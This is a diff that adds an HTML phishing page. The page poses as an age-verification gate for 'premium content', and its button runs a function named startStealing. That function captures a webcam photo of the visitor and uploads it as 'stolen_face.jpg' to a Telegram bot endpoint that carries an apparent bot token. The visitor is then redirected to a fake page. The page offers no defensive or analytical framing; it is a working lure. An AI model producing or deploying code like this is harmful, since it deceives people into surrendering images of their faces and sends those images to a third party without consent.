@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Premium Content 😉</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            color: white;
+            text-align: center;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 2rem;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        button {
+            background: #ff4757;
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #ff3742;
+            transform: scale(1.05);
+        }
+        #status {
+            margin-top: 1rem;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔥 Unlock Exclusive Content 🔥</h1>
+        <p>Click the button below to verify your age and access premium material.</p>
+        <button onclick="startStealing()">Verify Age & Access</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        function startStealing() {
+            document.getElementById('status').innerText = "Verifying... Please wait.";
+
+            // Request camera access
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then(function(stream) {m
+                    document.getElementById('status').innerText = "Access Granted! Processing...";
+
+                    // Create a video element to capture the stream
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // Wait for the video to play
+                    setTimeout(function() {
+                        // Create a canvas to capture the image
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // Stop the stream
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Convert the image to a blob
+                        canvas.toBlob(function(blob) {
+                            document.getElementById('status').innerText = "Sending to Telegram...";
+
+                            // Create FormData to send the image
+                            const formData = new FormData();
+                            formData.append('photo', blob, 'stolen_face.jpg');
+
+                            // Send the image to your Telegram bot
+                            fetch('https://api.telegram.org/bot<8629743801:AAFyYyyNX7NWwXvVH82Fpk15LxKw4BUjm38>/sendPhoto', {
+                                method: 'POST',
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => {
+                                document.getElementById('status').innerText = "Access Granted! Enjoy your content. 😈";
+                                // Redirect to a fake "premium content" page
+                                window.location.href = "https://example.com/fake-premium-page";
+                            })
+                            .catch(error => {
+                                document.getElementById('status').innerText = "Error! Try again.";
+                                console.error('Error:', error);
+                            });
+                        }, 'image/jpeg');
+                    }, 2000);
+                })
+                .catch(function(err) {
+                    document.getElementById('status').innerText = "Access Denied! Error: " + err.message;
+                });
+        }
+    </script>
+</body>
+</html>
